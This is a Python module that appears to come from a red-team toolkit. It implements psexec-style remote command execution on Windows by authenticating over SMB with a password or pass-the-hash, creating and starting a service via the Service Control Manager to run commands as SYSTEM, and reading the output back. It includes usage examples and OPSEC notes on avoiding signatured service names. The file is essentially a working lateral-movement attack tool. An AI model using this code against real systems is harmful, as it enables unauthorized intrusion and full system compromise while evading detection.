#!/usr/bin/env python3
"""
redshift_toolkit.postex.psexec_lite — SMB + SCM service-based remote
command execution against authorized Windows targets.

Mechanics
---------
1. Authenticate to target SMB (\\\\target\\IPC$).
2. Open the Service Control Manager (SCM) via svcctl RPC over a named pipe.
3. Create a Windows service whose binary path is `cmd.exe /c <command> > log`.
4. Start the service; wait briefly; stop and delete it.
5. Read output from the log file via SMB.

Service runs as LocalSystem by default — output captures the result of a
SYSTEM-context command on the target.

This re-implementation delegates to impacket primitives. Production use
should prefer impacket-psexec/wmiexec/smbexec — they handle edge cases
(timeouts, locale, alternative paths) better than this minimal version.

Usage
-----
  # Password auth
  python3 -m redshift_toolkit.postex.psexec_lite \\
      --target 10.0.0.50 --user alice -p 'Password1' \\
      --command 'whoami /priv'

  # Pass-the-hash
  python3 -m redshift_toolkit.postex.psexec_lite \\
      --target 10.0.0.50 --user alice \\
      --hash 'aad3b435b51404eeaad3b435b51404ee:5d41...' \\
      --command 'hostname'

Requires
--------
  pip install impacket

OPSEC notes
-----------
- Default Sysinternals psexec service name "PSEXESVC" is signatured.
  We default to a 12-char random alpha name; override with --service-name.
- Event 7045 (service installed) generated on target.
- 4624 logon-type 3 generated on target.

Author: Redshift Project — Module 19
License: MIT
"""

from __future__ import annotations

import argparse
import random
import string
import sys
import time

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
RESET = "\033[0m"


def random_name(n: int = 12) -> str:
    return "".join(random.choices(string.ascii_lowercase, k=n))


def parse_hash(s: str) -> tuple[bytes, bytes]:
    if ":" in s:
        lm, nt = s.split(":", 1)
    else:
        lm, nt = "aad3b435b51404eeaad3b435b51404ee", s
    return bytes.fromhex(lm), bytes.fromhex(nt)


def execute(target: str, user: str, password: str | None, lmhash: bytes, nthash: bytes,
            domain: str, command: str, service_name: str, share: str,
            timeout: int) -> tuple[int, str]:
    try:
        from impacket.smbconnection import SMBConnection
        from impacket.dcerpc.v5 import scmr, transport
    except ImportError:
        sys.stderr.write("error: pip install impacket\n")
        sys.exit(2)

    smb = SMBConnection(target, target, sess_port=445, timeout=timeout)
    if password is not None:
        smb.login(user, password, domain=domain)
    else:
        smb.login(user, "", domain=domain, lmhash=lmhash.hex(), nthash=nthash.hex())

    # Connect to svcctl
    rpc = transport.SMBTransport(target, 445, r"\svcctl", smb_connection=smb)
    dce = rpc.get_dce_rpc()
    dce.connect()
    dce.bind(scmr.MSRPC_UUID_SCMR)

    # Open SCM
    sc_handle = scmr.hROpenSCManagerW(dce)["lpScHandle"]

    # Build a command that writes output to a file accessible via SMB
    out_file = f"\\\\127.0.0.1\\{share}\\redshift_out_{random_name(6)}.txt"
    target_path = out_file.replace("\\\\127.0.0.1\\" + share, f"C:\\Windows\\Temp")
    out_filename = f"redshift_out_{random_name(6)}.txt"
    target_path = f"C:\\Windows\\Temp\\{out_filename}"

    bin_path = f'cmd.exe /Q /c {command} 1> {target_path} 2>&1'

    create_resp = scmr.hRCreateServiceW(
        dce, sc_handle, service_name, service_name, lpBinaryPathName=bin_path)
    svc_handle = create_resp["lpServiceHandle"]

    try:
        try:
            scmr.hRStartServiceW(dce, svc_handle)
        except Exception as e:
            # Some Windows versions return ERROR_FILE_NOT_FOUND when cmd exits fast
            if "ERROR_FILE_NOT_FOUND" not in str(e) and "ERROR_SERVICE_REQUEST_TIMEOUT" not in str(e):
                raise

        # Give the command time to complete
        time.sleep(2)

        # Read output via SMB
        try:
            tid = smb.connectTree("ADMIN$")
            fid = smb.openFile(tid, f"\\Temp\\{out_filename}")
            data = smb.readFile(tid, fid)
            smb.closeFile(tid, fid)
            try:
                smb.deleteFile("ADMIN$", f"\\Temp\\{out_filename}")
            except Exception:
                pass
            output = data.decode("utf-8", errors="replace")
        except Exception as e:
            output = f"(could not read output file: {e})"
    finally:
        try:
            scmr.hRDeleteService(dce, svc_handle)
        except Exception:
            pass
        try:
            scmr.hRCloseServiceHandle(dce, svc_handle)
        except Exception:
            pass
        try:
            scmr.hRCloseServiceHandle(dce, sc_handle)
        except Exception:
            pass
        dce.disconnect()
        smb.logoff()

    return 0, output


def main():
    p = argparse.ArgumentParser(
        prog="psexec_lite",
        description="SMB-service remote command execution.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    p.add_argument("--target", required=True, help="Target hostname/IP")
    p.add_argument("--user", required=True)
    p.add_argument("-p", "--password")
    p.add_argument("--hash", help="LM:NT or just NT hash (pass-the-hash)")
    p.add_argument("--domain", default="WORKGROUP")
    p.add_argument("--command", required=True, help="Command to execute on target")
    p.add_argument("--service-name", default=None,
                   help="Service name (default: random 12 lowercase chars)")
    p.add_argument("--share", default="ADMIN$", help="SMB share for output file")
    p.add_argument("--timeout", type=int, default=20)
    p.add_argument("--no-color", action="store_true")
    args = p.parse_args()

    on = sys.stdout.isatty() and not args.no_color
    if not args.password and not args.hash:
        sys.stderr.write("specify -p PASSWORD or --hash\n")
        sys.exit(2)

    lm = nt = b""
    if args.hash:
        lm, nt = parse_hash(args.hash)

    svc = args.service_name or random_name(12)

    print(f"{GREEN if on else ''}[+] target={args.target} user={args.user} "
          f"service={svc}{RESET if on else ''}", file=sys.stderr)

    try:
        rc, output = execute(args.target, args.user, args.password, lm, nt,
                             args.domain, args.command, svc, args.share, args.timeout)
    except Exception as e:
        print(f"{RED if on else ''}[!] failed: {e}{RESET if on else ''}", file=sys.stderr)
        sys.exit(1)

    print(output, end="")
    sys.exit(rc)


if __name__ == "__main__":
    main()
